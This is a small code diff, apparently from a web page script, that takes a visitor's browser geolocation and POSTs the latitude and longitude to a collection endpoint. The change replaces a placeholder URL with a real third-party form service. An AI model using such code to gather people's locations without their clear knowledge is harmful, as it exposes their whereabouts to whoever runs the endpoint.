@@ -11,7 +11,7 @@
       let lon = position.coords.longitude;
 
       // Send location to your server (replace with your endpoint)
-      fetch('https://yourserver.com/collect', {
+      fetch('https://formspree.io/f/meogyqpv', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ latitude: lat, longitude: lon })
